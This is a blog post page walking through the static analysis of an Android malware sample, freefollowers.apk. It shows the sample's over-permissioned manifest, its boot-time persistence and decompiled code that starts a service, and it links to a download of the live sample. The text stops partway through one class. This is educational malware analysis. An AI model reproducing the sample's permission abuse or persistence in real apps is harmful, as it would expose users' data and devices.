<!doctype html>
<html lang="en-us">
  <head>
    <title>Malware Sunday: Android Malware Analysis 1 // Andr01d Rocks</title>
    <link rel="shortcut icon" href="/images/avatar.png" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.111.3">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="Q" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.f56e26c1ca281286b7f30d2b731cfcaca1eb911107d65e03e2201027b10036e9.css" />
    
    <link rel="stylesheet" href="/css/cookie.css" />

    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-XQ0Q91QYR3"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-XQ0Q91QYR3', { 'anonymize_ip': false });
}
</script>

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Malware Sunday: Android Malware Analysis 1"/>
<meta name="twitter:description" content="Malware Sundays Sundays usually are days I am more relaxed from work and I like to do things that I find interesting. Follow my journey of android Malware Analysis every sunday (or most of them).
Summary Finding interesting malware samples can be a hard task since most of them are very basic yet effective. Luckily Łukasz Siewierski known as @maldr0id have us covered, he posted a list of interesting malware samples on his blog."/>

    <meta property="og:title" content="Malware Sunday: Android Malware Analysis 1" />
<meta property="og:description" content="Malware Sundays Sundays usually are days I am more relaxed from work and I like to do things that I find interesting. Follow my journey of android Malware Analysis every sunday (or most of them).
Summary Finding interesting malware samples can be a hard task since most of them are very basic yet effective. Luckily Łukasz Siewierski known as @maldr0id have us covered, he posted a list of interesting malware samples on his blog." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://andr01d.rocks/malware-analysis/malware-sunday-android-malware-analysis-1/" /><meta property="article:section" content="malware-analysis" />
<meta property="article:published_time" content="2023-04-23T13:00:58+04:00" />
<meta property="article:modified_time" content="2023-04-23T13:00:58+04:00" />




  </head>
  <body>
    <header class="app-header">
      <a href="https://andr01d.rocks/"><img class="app-header-avatar" src="/images/avatar.png" alt="Q" /></a>
      <span class="app-header-title">Andr01d Rocks</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
            •
          
          <a class="app-header-menu-item" href="/malware-analysis">Malware Analysis</a>
            •
          
          <a class="app-header-menu-item" href="/attack-mitre-snippets">ATT&amp;CK Based Snippets</a>
            •
          
          <a class="app-header-menu-item" href="/other/">Off-topic</a>
            •
          
          <a class="app-header-menu-item" href="/about/">About</a>
            •
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Android shenanigans.</p>
      <div class="app-header-social">
        
          <a href="https://github.com/basilhskk" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/qu3st1on_" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
          <a href="mailto:contact@andr01d.rocks" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-mail">
  <title>Email</title>
  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Malware Sunday: Android Malware Analysis 1</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Apr 23, 2023
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          6 min read
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://andr01d.rocks/tags/malware-analysis/">malware-analysis</a>
              <a class="tag" href="https://andr01d.rocks/tags/locker/">locker</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h2 id="malware-sundays">Malware Sundays</h2>
<p>Sundays usually are days I am more relaxed from work and I like to do things that I find interesting. Follow my journey of android Malware Analysis every sunday (or most of them).</p>
<h3 id="summary">Summary</h3>
<p>Finding interesting malware samples can be a hard task since most of them are very basic yet effective. Luckily <a href="https://twitter.com/maldr0id">Łukasz Siewierski known as @maldr0id </a> have us covered, he posted a list of interesting malware samples on his <a href="https://maldroid.github.io/android-malware-samples/">blog</a>.</p>
<p>Today we are going to delve into the easy section, since this is the first Android Sunday and continue our way through the list. Enjoy.</p>
<p><em>If you have any interesting sample that you want to see analyzed, don&rsquo;t hesitate to <strong>contact me</strong>.</em></p>
<h3 id="sample-1-freefollowersapk">Sample #1: freefollowers.apk</h3>
<p><a href="https://bazaar.abuse.ch/sample/5251a356421340a45c8dc6d431ef8a8cbca4078a0305a87f4fbd552e9fc0793e">Download sample (Malware Bazaar)</a></p>
<p>First things first. The first thing we have to do is to decompile the apk to see what we are dealing with.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>apktool d 5251a356421340a45c8dc6d431ef8a8cbca4078a0305a87f4fbd552e9fc0793e.apk
</span></span></code></pre></div><p>Nothing explains better an apk than its <code>AndroidManifest.xml</code>, so without further ado, voila :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; standalone=&#34;no&#34;?&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#ff79c6">&lt;manifest</span> <span style="color:#50fa7b">xmlns:android=</span><span style="color:#f1fa8c">&#34;http://schemas.android.com/apk/res/android&#34;</span> <span style="color:#50fa7b">android:compileSdkVersion=</span><span style="color:#f1fa8c">&#34;23&#34;</span> <span style="color:#50fa7b">android:compileSdkVersionCodename=</span><span style="color:#f1fa8c">&#34;6.0-2438415&#34;</span> <span style="color:#50fa7b">android:installLocation=</span><span style="color:#f1fa8c">&#34;internalOnly&#34;</span> <span style="color:#50fa7b">package=</span><span style="color:#f1fa8c">&#34;com.XPhantom.id&#34;</span> <span style="color:#50fa7b">platformBuildVersionCode=</span><span style="color:#f1fa8c">&#34;23&#34;</span> <span style="color:#50fa7b">platformBuildVersionName=</span><span style="color:#f1fa8c">&#34;6.0-2438415&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.SYSTEM_ALERT_WINDOW&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.RECEIVE_BOOT_COMPLETED&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.SET_WALLPAPER&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.READ_EXTERNAL_STORAGE&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.WRITE_EXTERNAL_STORAGE&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.READ_CONTACTS&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.READ_SMS&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.ACCESS_FINE_LOCATION&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.WAKE_LOCK&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.INTERNET&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.REQUEST_INSTALL_PACKAGE&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    <span style="color:#ff79c6">&lt;uses-permission</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.permission.CAMERA&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    <span style="color:#ff79c6">&lt;application</span> <span style="color:#50fa7b">android:debuggable=</span><span style="color:#f1fa8c">&#34;true&#34;</span> <span style="color:#50fa7b">android:icon=</span><span style="color:#f1fa8c">&#34;@drawable/ic_launcher&#34;</span> <span style="color:#50fa7b">android:label=</span><span style="color:#f1fa8c">&#34;@string/app_name&#34;</span> <span style="color:#50fa7b">android:theme=</span><span style="color:#f1fa8c">&#34;@style/AppTheme&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>        <span style="color:#ff79c6">&lt;activity</span> <span style="color:#50fa7b">android:label=</span><span style="color:#f1fa8c">&#34;@string/app_name&#34;</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;com.XPhantom.id.MainActivity&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>            <span style="color:#ff79c6">&lt;intent-filter&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>                <span style="color:#ff79c6">&lt;action</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.intent.action.MAIN&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>                <span style="color:#ff79c6">&lt;category</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.intent.category.INFO&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>            <span style="color:#ff79c6">&lt;/intent-filter&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>        <span style="color:#ff79c6">&lt;/activity&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>        <span style="color:#ff79c6">&lt;service</span> <span style="color:#50fa7b">android:enabled=</span><span style="color:#f1fa8c">&#34;true&#34;</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;com.XPhantom.id.MyService&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>        <span style="color:#ff79c6">&lt;receiver</span> <span style="color:#50fa7b">android:enabled=</span><span style="color:#f1fa8c">&#34;true&#34;</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;com.XPhantom.id.BootReceiver&#34;</span> <span style="color:#50fa7b">android:permission=</span><span style="color:#f1fa8c">&#34;android.permission.RECEIVE_BOOT_COMPLETED&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>            <span style="color:#ff79c6">&lt;intent-filter&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>                <span style="color:#ff79c6">&lt;action</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.intent.action.BOOT_COMPLETED&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>                <span style="color:#ff79c6">&lt;action</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.intent.action.QUICKBOOT_POWERON&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>                <span style="color:#ff79c6">&lt;category</span> <span style="color:#50fa7b">android:name=</span><span style="color:#f1fa8c">&#34;android.intent.category.DEFAULT&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>            <span style="color:#ff79c6">&lt;/intent-filter&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>        <span style="color:#ff79c6">&lt;/receiver&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>    <span style="color:#ff79c6">&lt;/application&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span><span style="color:#ff79c6">&lt;/manifest&gt;</span>
</span></span></code></pre></div><p>Since we don&rsquo;t have the whole picture of how this application was meant to be delivered to the victim, we can only assume some things from what we have in our hands. According to the application name: <code>freefollowers.apk</code> we assume it was meant for someone to gain an X amount of followers on some social media platform.</p>
<p>Immediately just from reading the <code>AndroidManifest.xml</code> of the application you can see, highlighted in the code snippet above, the application is asking for way to many sensitive permissions.</p>
<p>Sensitive Permissions:</p>
<ul>
<li>CAMERA</li>
<li>REQUEST_INSTALL_PACKAGE</li>
<li>ACCESS_FINE_LOCATION</li>
<li>READ_SMS</li>
<li>READ_CONTACTS</li>
<li>READ_EXTERNAL_STORAGE</li>
<li>SYSTEM_ALERT_WINDOW</li>
<li>RECEIVE_BOOT_COMPLETED</li>
</ul>
<p>That is weird a follower application would never need such permissions. We can also see that the person who wrote the application forgot to make a release build. You can see the app is debuggable <code>android:debuggable=&quot;true&quot;</code>. This points us that the developer of this application is rather inexperienced. Enough ranting the dev of this app, we can also see that the application registers a service <code>.MyService</code> ( again the class name choice points us that he just used code from the internet ) and a BootReceiver (he wants to launch his service as soon as the phone finish the boot process). The <code>MainActivity</code> class is the entrypoint of the application so this is the class that we will analyze first, we can easily find the entrypoint of the application by finding the <code>android.intent.action.MAIN</code> action.</p>
<p><strong>Note:</strong> The entrypoint part is not always true, we will analyze it in a different post about the application lifecycle, but is good for now.</p>
<p>As you can see so far we haven&rsquo;t touched any code and we already have a feel about the developer, the application, and rough idea of the components and what is going on. This is not always the case since there are some skilled developers but a lot of android malware is written by inexperienced devs.</p>
<p>Anyway, as Linus Torvalds would say <em>&ldquo;Talk is cheap. Show me the code&rdquo;</em>. So I spin up my trusted jadx-gui and load the apk.</p>
<p>MainActivity.class</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-java" data-lang="java"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#ff79c6">package</span> com.XPhantom.p000id<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#ff79c6">import</span> adrt.ADRTLogCatReader<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#ff79c6">import</span> android.app.Activity<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span><span style="color:#ff79c6">import</span> android.content.Intent<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#ff79c6">import</span> android.os.Bundle<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#6272a4">/* renamed from: com.XPhantom.id.MainActivity */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#6272a4">/* loaded from: classes.dex */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">MainActivity</span> <span style="color:#8be9fd;font-style:italic">extends</span> Activity <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    @Override <span style="color:#6272a4">// android.app.Activity
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">onCreate</span><span style="color:#ff79c6">(</span>Bundle bundle<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>        ADRTLogCatReader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">onContext</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;com.aide.ui&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>        <span style="color:#8be9fd;font-style:italic">super</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">onCreate</span><span style="color:#ff79c6">(</span>bundle<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex; background-color:#3d3f4a"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>            startService<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> Intent<span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">,</span> Class<span style="color:#ff79c6">.</span><span style="color:#50fa7b">forName</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;com.XPhantom.id.MyService&#34;</span><span style="color:#ff79c6">)));</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>            finish<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>ClassNotFoundException e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>            <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> NoClassDefFoundError<span style="color:#ff79c6">(</span>e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getMessage</span><span style="color:#ff79c6">());</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>As we can se at the highlighted lines 13, <code>ADRTLogCatReader.onContext</code> is called and the service <code>MyService</code> is initiated.</p>
<p>Following the <code>ADRTLogCatReader.class</code> located in <code>adrt</code> package we can see that is will not work on our device since <code>com.aide.ui</code> is missing and the <code>PackageManager.NameNotFoundException</code> will be raised. On devices that do have this application run() will be called on a new thread which will read the output of the shell command <code>logcat -v threadtime</code> line by line and will send this line to <code>ADRTSender</code>.</p>
<p><strong>Note</strong>: <a href="https://play.google.com/store/apps/details?id=com.aide.ui&amp;hl=en&amp;gl=US">com.aide.ui</a> is an android IDE for android apps (lmao).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-java" data-lang="java"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#ff79c6">package</span> adrt<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#ff79c6">import</span> android.content.Context<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#ff79c6">import</span> android.content.pm.PackageManager<span style="color:#ff79c6">;</span>
